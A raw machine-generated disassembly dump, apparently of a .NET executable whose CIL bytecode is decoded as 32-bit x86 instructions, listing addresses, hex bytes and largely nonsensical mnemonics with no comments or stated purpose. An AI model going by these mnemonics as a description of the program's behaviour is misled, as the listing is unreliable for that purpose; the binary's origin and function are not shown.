  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 f4 20 00       	and    $0x20f472,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 02                	jb     0x40307c
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 0c 21 00       	and    $0x210c72,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
